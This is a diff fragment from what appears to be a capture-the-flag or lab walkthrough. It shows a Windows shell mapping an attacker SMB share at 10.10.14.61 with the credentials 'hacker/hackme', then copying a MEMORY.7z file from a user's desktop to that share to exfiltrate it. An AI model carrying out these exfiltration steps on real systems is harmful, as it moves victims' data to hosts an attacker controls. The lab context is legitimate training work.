@@ -563,6 +563,13 @@ net use Z: \\10.10.14.61\share /user:hacker hackme
 The command completed successfully.
 
 PS C:\Users\mikasaAckerman\Desktop>
-
-
 ```
+
+Ill set where to send the file
+
+```python
+PS C:\Users\mikasaAckerman\Desktop> Copy-Item .\MEMORY.7z Z:\
+```
+
+Then ill copy it over
+
